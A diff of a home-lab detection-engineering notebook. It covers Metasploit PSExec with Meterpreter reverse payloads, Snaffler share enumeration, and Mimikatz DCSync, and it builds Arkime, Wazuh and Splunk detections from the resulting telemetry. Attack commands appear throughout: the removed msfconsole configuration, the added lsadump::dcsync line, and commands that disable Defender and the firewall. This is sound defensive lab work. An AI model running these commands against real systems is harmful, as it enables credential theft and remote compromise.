@@ -54,83 +54,29 @@ Use Metasploit's PSExec module to remotely execute a payload on a victim Windows
    ```
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
    ```
-   Confirmed with `Get-MpComputerStatus | Select AMRunningMode` → "Not running"
 4. Disabled Windows Firewall on Win11V:
    ```powershell
    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
    ```
-5. Launched Metasploit on LinuxA with `sudo msfconsole` and configured PSExec:
-   ```
-   use exploit/windows/smb/psexec
-   set sslversion TLS1.2
-   set rhosts <victim IP>
-   set smbuser Administrator
-   set smbdomain <REDACTED>
-   set smbpass <REDACTED>
-   set lport 443
-   set payload windows/meterpreter/reverse_https
-   set target 0
-   ```
-6. Initial attempts with x64 payloads (`windows/x64/meterpreter/reverse_https`, `windows/x64/meterpreter/reverse_tcp`) failed — service binary would not execute on ARM64 Windows under emulation
-7. Switched to x86 payload `windows/meterpreter/reverse_tcp` on port 4444 — session opened successfully as `NT AUTHORITY\SYSTEM`
-8. Re-ran with x86 HTTPS payload `windows/meterpreter/reverse_https` on port 443 to generate TLS traffic for Malcolm analysis
-9. Ran `shell`, `whoami`, and `ipconfig` inside the Meterpreter session to generate traffic
-10. Captured traffic on LinuxA using tcpdump:
-    ```bash
-    sudo tcpdump -i enp6s18 host <victim IP> -w /tmp/psexec_capture.pcap
-    ```
-11. Uploaded PCAP to Malcolm and committed the file
-12. Analyzed sessions in Arkime
+5. Configured and launched Metasploit PSExec module with x86 payload (x64 payloads fail on ARM64 Windows)
+6. Captured traffic on LinuxA using tcpdump, uploaded PCAP to Malcolm
+7. Analyzed sessions in Arkime
 
 ### Telemetry / Detections
 
-**Malcolm / Arkime — Session Overview**
+**Malcolm / Arkime — NTLM Authentication**
 
-104 sessions captured between LinuxA and Win11V after PCAP upload, including tcp, tls, smb, ntlm, ssl, and conn log types across zeek, suricata, and arkime data sources.
+Query: `ip == <attacker IP> && ip == <victim IP> && protocols == ntlm`
 
-**Malcolm / Arkime — NTLM Authentication (from packet capture)**
-
-Arkime query: `ip == <attacker IP> && ip == <victim IP> && protocols == ntlm`
-
-Key findings from NTLM session expansion:
-- **User:** Administrator
-- **Originating Host:** LinuxA on port 34451
-- **Responding Host:** Win11V on port 445
-- **Action:** Authenticate → **Result:** Success
-- **Protocols:** tcp, gssapi, smb, ntlm
-- **OUI identification:** Source MAC → Proxmox Server Solutions GmbH, Dest MAC → Parallels, Inc.
-
-This authentication data was extracted entirely from the packet capture with no host-based logging required.
+Administrator authenticated from LinuxA to Win11V on port 445. Action: Authenticate → Result: Success. Extracted entirely from packet capture with no host-based logging required.
 
 **Malcolm / Arkime — TLS Session Analysis**
 
-Expanded TLS session details:
-- **TLS Version:** TLSv1.2 (set intentionally; TLS 1.3 fully encrypts the data we need here)
-- **Cipher:** TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
-- **JA3 Hash:** `0696c16261fe58808f9fa965be137acd`
-- **JA3s Hash:** `ec74a5c51106f0419184d0dd08fb05bc`
-- **JA4:** `t13i2012h2_2b729b4bf6f3_e24568c0d440`
-- **JA4s:** `t120400_c030_12a20535f9be`
+- JA3: `0696c16261fe58808f9fa965be137acd`
+- JA3s: `ec74a5c51106f0419184d0dd08fb05bc`
+- Certificate Thumbprint: `da:9e:2c:b8:93:e7:0d:a1:a2:98:99:98:67:d3:e5:e2:e6:6b:38:45` (self-signed, Metasploit-generated)
 
-**Certificate Information:**
-- **Issuer/Subject:** Self-signed (Metasploit-generated)
-- **Certificate Thumbprint:** `da:9e:2c:b8:93:e7:0d:a1:a2:98:99:98:67:d3:e5:e2:e6:6b:38:45`
-- **Validity:** 2024/09/22 – 2029/09/21
-- **Tags:** cert:self-signed
-
-**Malcolm / Arkime — JA3 Pivot**
-
-Filtered all sessions by JA3 hash to scope investigation beyond a single IP. In a real-world environment with thousands of hosts, this fingerprint would surface additional compromised systems using the same C2 implant even if only a subset had endpoint logging enabled.
-
-**Malcolm / Arkime — Certificate Thumbprint Pivot**
-
-Filtered by certificate hash to find all sessions using the same Metasploit-generated self-signed certificate. Like JA3, this provides another investigation pivot point independent of IP addresses.
-
-**Malcolm — Connections View with Baseline**
-
-Connections tab showing the two-node relationship graph with 24-hour baseline enabled. Sparkle icons indicate both hosts are newly communicating within the baseline period — a useful indicator for identifying anomalous network relationships.
-
-**Splunk — Command Line Length Detection (pending license reset)**
+**Splunk — Command Line Length Detection**
 
 ```splunk
 index=sysmon
@@ -139,43 +85,136 @@ index=sysmon
 | eval ParentCommandLineLength = len(ParentCommandLine)
 | where (ParentCommandLineLength > 2500 OR CommandLineLength > 2500)
 | where ParentImage != "C:\\Windows\\explorer.exe"
-| where ParentImage != "C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe"
 | table CommandLine,ProcessGuid
 ```
 
-Splunk license exceeded daily 500MB quota — queries will be run after midnight reset.
+### Notes & Gotchas
+
+- Parallels bridged networking via Wi-Fi fails on Apple Silicon — use USB-C Ethernet adapter with dual-adapter setup
+- x64 Metasploit payloads fail silently on ARM64 Windows — use x86 payloads
+- Malcolm requires manual PCAP upload; does not auto-capture LAN traffic without SPAN port
+
+---
+
+## Lab 2 — Credential Access: File Shares
+**Module:** 09 - Credential Access on Windows Hosts - File Shares  
+**Date:** 2026-06-21  
+**Status:** [x] Complete  
+**MITRE:** T1552.001, T1135, T1039
+
+### Objective
+Detect credential access through SMB file shares using Windows Event ID 5145 (Detailed File Share audit). Create test shares and a low-privileged user, run Snaffler to enumerate shares and find sensitive files, then build detections for sensitive file access and high-volume share enumeration failures.
+
+### Steps Taken
+
+1. Enabled Detailed File Share auditing on DC (not enabled by default):
+   ```powershell
+   auditpol /set /subcategory:"Detailed File Share" /success:enable /failure:enable
+   ```
+2. Created `lowpriv` AD user denied access to test shares
+3. Created 15 test SMB shares on DC:
+   ```powershell
+   $numbers = 1..15
+   foreach($number in $numbers) {
+       New-Item "C:\Shares\Share$number" -itemType Directory
+       New-SmbShare -Name "Logs$number" -Path "C:\Shares\Share$number" -NoAccess lowpriv -FullAccess 'Everyone'
+   }
+   ```
+4. Created `passwords.txt` in Logs1 share as a sensitive file target
+5. Validated Event ID 5145 telemetry from Win11A:
+   - Successful share browse → 5145 with `Relative Target Name: \`, access granted
+   - Denied access as `lowpriv` → 5145 with explicit deny ACE
+   - File-level access → 5145 with `Relative Target Name: passwords.txt`
+6. Downloaded Snaffler v1.0.126 to Win11A (Defender + Tamper Protection disabled first)
+7. Ran Snaffler as Administrator — found `passwords.txt` plus real sensitive files including `unattend.xml` with credential material left from OS installation
+8. Ran Snaffler as `lowpriv` — generated bulk failure telemetry against all 15 denied shares
+9. Built and validated detection queries in Wazuh (Splunk license hard-blocked)
+
+### Telemetry / Detections
+
+**Wazuh — Sensitive File Access Detection**
+
+```
+data.win.system.eventID: 5145 AND data.win.eventdata.relativeTargetName: *password*
+```
+Result: 19 hits — caught `passwords.txt` plus Splunk `remote-password-management` files from Snaffler's C$ crawl.
+
+**Wazuh — Share Enumeration by Account**
+
+```
+data.win.system.eventID: 5145 AND data.win.eventdata.subjectUserName: lowpriv
+```
+Result: 116 hits — spike in histogram corresponds to Snaffler run timing.
+
+**Key field mappings in Wazuh for Event ID 5145:**
+- `data.win.eventdata.shareName` — share path
+- `data.win.eventdata.relativeTargetName` — filename within share (`\` = share root browse)
+- `data.win.eventdata.subjectUserName` — account performing access
+- `data.win.eventdata.ipAddress` — source IP
+- `data.win.system.severityValue` — `AUDIT_SUCCESS` or `AUDIT_FAILURE`
 
 ### Notes & Gotchas
 
-**Parallels Bridged Networking on Apple Silicon**
-- Bridged networking via Wi-Fi does not work on Parallels with Apple Silicon — adapter shows "Media disconnected" regardless of settings
-- Bridged networking via USB-C Ethernet adapter (AX88179B chipset) also initially failed — "Network initialization failed" error when set as the only adapter
-- **Solution that worked:** Keep original adapter on Shared Network, add a second adapter bridged to the USB-C Ethernet, reboot the VM. After reboot, the bridged adapter picked up a LAN address via DHCP from the router
-- This is a critical fix — multiple future course modules require the attacker VM to connect directly to Windows targets
+- **Event ID 5145 requires manual auditpol enablement** — `Detailed File Share` subcategory is off by default
+- **auditpol vs GPO:** Local auditpol settings can be overwritten on next gpupdate if a GPO defines audit policy — proper fix is to configure via Advanced Audit Policy Configuration in GPO
+- **Snaffler v1.0.126 required** — latest version was broken at time of course writing
+- **Defender + Tamper Protection:** Must disable Tamper Protection in Windows Security UI before registry-based Defender disable will stick
+- **Real finding:** Snaffler found `unattend.xml` at `ADMIN$\Panther\` containing redacted credential material from Windows installation — demonstrates real-world impact of share enumeration
+- **SYSVOL/ADMIN$ noise:** These shares generate thousands of 5145 events and must be filtered for file share crawling detections
 
-**ARM64 Payload Compatibility**
-- Win11V runs ARM64 Windows on Parallels/Apple Silicon
-- x64 Metasploit payloads (`windows/x64/meterpreter/reverse_https`, `windows/x64/meterpreter/reverse_tcp`) fail silently — the PSExec service binary does not execute under x64 emulation on ARM64
-- **x86 payloads work:** `windows/meterpreter/reverse_tcp` and `windows/meterpreter/reverse_https` both establish sessions successfully
-- This is an important distinction from the `Sysmon64a.exe` requirement — Sysmon needs the ARM64-native binary, but Metasploit payloads need x86 (not x64) for emulation compatibility
+---
 
-**Malcolm PCAP Upload Workflow**
-- Malcolm does not automatically capture LAN traffic — it only sees traffic on its own interface unless a SPAN/mirror port is configured on the switch
-- For this lab: captured traffic on LinuxA with `tcpdump -i enp6s18 host <target> -w /tmp/capture.pcap`, then uploaded to Malcolm via the web UI at `/upload`
-- Malcolm credentials reset: use `./scripts/auth_setup` → option 3 (admin) from the Malcolm VM
+## Lab 3 — Credential Access: DCSync
+**Module:** 11 - Credential Access on Windows Hosts - DCSync  
+**Date:** 2026-06-21  
+**Status:** [x] Complete  
+**MITRE:** T1003.006
 
-**Splunk Free License**
-- Trial license expired after exceeding 500MB/day limit multiple times
-- Switched to Free license via Settings → Licensing → Change license group
-- Free license blocks searches when daily quota exceeded — resets at midnight
-- For future: be mindful of ingestion volume; consider disabling unnecessary inputs during non-lab periods
+### Objective
+Execute a DCSync attack using Mimikatz to replicate Active Directory credentials from the domain controller, then detect it using Windows Event ID 4662 (directory service object access) correlated with Event ID 4624 (logon) to identify the source as a workstation rather than a legitimate DC.
 
-**Key Investigative Concepts from This Section**
-- NTLM authentication details can be extracted from packet captures without any host logging — provides a fallback when endpoint telemetry is unavailable
-- JA3/JA3s hashes fingerprint TLS handshake behavior — useful for pivoting beyond IP-based investigation
-- Certificate thumbprints provide another pivot point for scoping incidents
-- TLS 1.2 was used intentionally — TLS 1.3 encrypts the handshake data that makes JA3 analysis possible
-- Connection baselining in Malcolm highlights new/anomalous network relationships
+### Steps Taken
+
+1. Enabled Directory Service Access auditing on DC:
+   ```powershell
+   auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable
+   ```
+2. Downloaded and extracted Mimikatz to Win11A
+3. Executed DCSync from Mimikatz on Win11A:
+   ```
+   lsadump::dcsync /domain:<REDACTED> /user:Administrator
+   ```
+4. Mimikatz successfully replicated Administrator credentials including NTLM hash and Kerberos keys
+5. Queried Wazuh for Event ID 4662 with DCSync replication GUID
+6. Correlated 4662 logon ID with 4624 to identify source IP as Win11A (a workstation)
+
+### Telemetry / Detections
+
+**Wazuh — DCSync Detection (Event ID 4662)**
+
+```
+data.win.system.eventID: 4662 AND data.win.eventdata.properties: *1131f6ad*
+```
+Result: 1 hit — GUID `{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}` (DS-Replication-Get-Changes-All) confirmed in properties field.
+
+**Wazuh — Logon Correlation (Event ID 4624)**
+
+```
+data.win.system.eventID: 4624 AND data.win.eventdata.targetLogonId: <logon ID from 4662>
+```
+Result: 1 hit — source IP confirmed as Win11A (a workstation). Authentication via Kerberos, Logon Type 3. Only domain controllers should perform AD replication — replication from a workstation IP is definitive DCSync evidence.
+
+**Key detection logic:**
+- Event 4662 fires when directory replication rights are exercised
+- GUID `{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}` = DS-Replication-Get-Changes-All
+- Joining with 4624 via LogonId exposes the source IP
+- Source IP not belonging to a DC = confirmed attack
+
+### Notes & Gotchas
+
+- **Event ID 4662 requires manual auditpol enablement** — `Directory Service Access` subcategory is off by default
+- **Splunk license hard-blocked** — all queries run in Wazuh; field names differ from course SPL examples
+- **Malcolm network detection skipped** — `zeek.notice.msg == drsuapi::DRSGetNCChanges` would detect this at the network layer but Malcolm has no live capture configured without a SPAN port
 
 ---
 
